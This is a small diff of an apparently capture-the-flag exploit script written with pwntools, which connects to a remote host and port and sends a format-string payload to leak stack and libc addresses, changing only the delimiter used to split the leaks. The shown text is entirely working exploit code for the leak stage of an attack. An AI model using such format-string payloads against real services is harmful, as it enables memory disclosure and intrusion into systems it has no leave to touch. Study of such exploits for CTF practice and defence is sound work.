@@ -466,10 +466,10 @@ p = remote("143.244.138.133",8001)
 # gdb.attach(p,"init-pwndbg")
 libc = ELF("./libc.so.6")
 p.recvuntil("Enter your username: ")
-p.sendline("%13$p.%21$p|%15$p")
+p.sendline("%13$p.%21$p^%15$p")
 
 leak_1 = p.recvuntil(".")[6:-1]
-leak_2 = p.recvuntil("|")[:-1]
+leak_2 = p.recvuntil("^")[:-1]
 leak_3 = p.recvline()
 
 leak_1 = int(leak_1,16)
